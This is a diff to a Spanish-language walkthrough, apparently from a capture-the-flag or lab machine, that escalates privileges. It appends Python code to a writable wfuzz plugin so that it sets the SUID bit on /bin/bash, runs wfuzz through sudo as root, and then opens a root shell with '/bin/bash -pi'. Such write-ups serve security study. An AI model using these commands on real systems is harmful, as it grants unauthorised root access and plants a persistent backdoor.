@@ -55,3 +55,8 @@ que es un archivo que pertenece a [[WFUZZ]] viendo con el parámetro `help` de e
 Al tener permisos de escritura sobre el modulo mencionado anteriormente lo modificamos para cambiar los permisos SUID de la `bash` y así poder ejecutarla como root
 `echo -e 'import os\nos.system("chmod 4755 /bin/bash")' >> /usr/lib/python3/dist-packages/wfuzz/plugins/payloads/range.py`
 
+Ahora ejecutamos `WFUZZ` como root
+`sudo -u root /usr/bin/wfuzz -c -z range,1-65535 -u http://127.0.0.1/FUZZ`
+
+Vemos que se han cambiado los permisos de la `bash` haciendo un ls y la ejecutaremos con `/bin/bash -pi` obteniendo una bash como root
+
